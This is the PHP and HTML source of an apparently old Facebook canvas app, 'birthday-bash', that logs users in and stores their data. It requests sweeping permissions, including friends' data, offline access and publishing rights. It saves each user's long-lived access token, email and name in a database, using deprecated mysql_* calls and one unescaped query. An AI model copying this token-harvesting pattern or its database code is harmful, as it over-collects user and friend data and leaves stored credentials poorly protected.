<?php

require 'config.php';
require 'facebook.php';
$fb_app_url="http://apps.facebook.com/birthday-bash/";
//connect to mysql database
$con=mysql_connect($db_host, $db_username, $db_password);
if (!$con)
  {
  die('PLEASE RELOAD THE PAGE   Could not connect: ' . mysql_error());
  }
mysql_select_db($db_name);
mysql_query("SET NAMES utf8");

//Create facebook application instance.
$facebook = new Facebook(array(
  'appId'  => $fb_app_id,
  'secret' => $fb_secret
));

//get user- if present, insert/update access_token for this user
$user = $facebook->getUser();
if($user){
	
	
	//get user data and access token
	try {
		$userData = $facebook->api('/me');
	} catch (FacebookApiException $e) {
		die("API call failed");
	}
	$accessToken = $facebook->getAccessToken(
	array(
                'scope'         => 'user_birthday,friends_birthday,user_interests,friends_interests,user_likes,friends_likes,user_status,friends_status,email,read_friendlists,offline_access,publish_stream,status_update,create_note,photo_upload, share_item, status_update, user_about_me, video_upload'
            )
	);
	
	//check that user is not already inserted? If is. check it's access token and update if needed
	//also make sure that there is only one access_token for each user
	$row = null;
	$result = mysql_query("
		SELECT
			*
		FROM
			offline_access_users
		WHERE
			user_id = '" . mysql_real_escape_string($userData['id']) . "'
	");
	
	if($result){
		$row = mysql_fetch_array($result, MYSQL_ASSOC);
		if(mysql_num_rows($result) > 1){
			mysql_query("
				DELETE FROM
					offline_access_users
				WHERE
					user_id='" . mysql_real_escape_string($userData['id']) . "' AND
					id != '" . $row['id'] . "'
			");
		}
	}
	
	if(!$row){
		mysql_query(
			"INSERT INTO 
				offline_access_users
			SET
				`user_id` = '" . mysql_real_escape_string($userData['id']) . "',
				`email` = '" . mysql_real_escape_string($userData['email']) . "',
				`name` = '" . mysql_real_escape_string($userData['name']) . "',
				`access_token` = '" . mysql_real_escape_string($accessToken) . "'
		");
	} else {
		mysql_query(
			"UPDATE 
				offline_access_users
			SET
				`access_token` = '" . mysql_real_escape_string($accessToken) . "'
			WHERE
				`id` = " . $user . "
		");
	}
}

//redirect to facebook page
if(isset($_GET['code'])){
	header("Location: " . $fb_app_url);
	exit;
}

//create authorising url
if(!$user){
	$loginUrl = $facebook->getLoginUrl(array(
		'canvas' => 1,
		'fbconnect' => 0,
		    'scope'         => 'user_birthday,friends_birthday,user_interests,friends_interests,user_likes,friends_likes,user_status,friends_status,email,read_friendlists,offline_access,publish_stream,status_update,create_note,photo_upload, share_item, status_update, user_about_me, video_upload'
           ));
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="description" content="eim" />
	<meta name="keywords" content="engineerinme,jamia" />	
	<meta name="author" content="Luka Cvrk (www.solucija.com)" />
	<link rel="stylesheet" href="../includes/css/main.css" type="text/css" />
	
	<link rel="stylesheet" type="text/css" href="styles.css" />
	

	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.0/jquery.min.js"></script>
        <script type="text/javascript" src="script.js"></script>

<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>

<link rel="stylesheet" type="text/css" href="formwizard.css" />

<script src="formwizard.js" type="text/javascript">

/***********************************************
* jQuery Form to Form Wizard- (c) Dynamic Drive (www.dynamicdrive.com)
* This notice MUST stay intact for legal use
* Visit http://www.dynamicdrive.com/ for this script and 100s more.
***********************************************/

</script>


	<title>Engineerinme</title>
</head>
<body>
		<?php if ($user){ ?>
		<div class="wrap">
	
		
		<ul id="menu">
			<li><a href="../index.php">Home</a></li>
			<li><a href="https://www.facebook.com/site.engineerinme" target="" >Share us</a></li>
			<li><a href="http://updates.engineerinme.com" target= "  ">updates</a></li>
			<li><a href="contact.html">contact us</a></li>
			<h2>About Engineerinme</h2>
			
		</ul>
		
		<div id="text">
			
<div id="main">

<ul class="tabContainer">
<!-- The jQuery generated tabs go here -->
</ul>

<div class="clear"></div>

<div id="tabContent">
	<div id="contentHolder">
    	<!-- The AJAX fetched content goes here -->
    </div>
</div>

</div>
<?php }
			 else
			  { 
			 echo "<script type='text/javascript'>top.location.href = '$loginUrl';</script>";
                           		 } ?>
			
		</div>

		<div id="green_bubble">
			<p><a href =" https://www.facebook.com/apps/application.php?id=164181646991260" target= ""  >share with us</a></p>
		</div>
	</div>

	<div id="footer">
		<div class="wrap">
			<div id="bubble"><p><p><div id="fb-root"></div><script src="http://connect.facebook.net/en_US/all.js#appId=256499181042648&amp;xfbml=1"></script><fb:like href="http://www.facebook.com/site.engineerinme" send="true" width="250" show_faces="true" font=""></fb:like></p>
			</div></p></div>
			<div id="copyright">
				
			<div class="clear"></div>
		</div>
	</div>
	
</body>
</html>





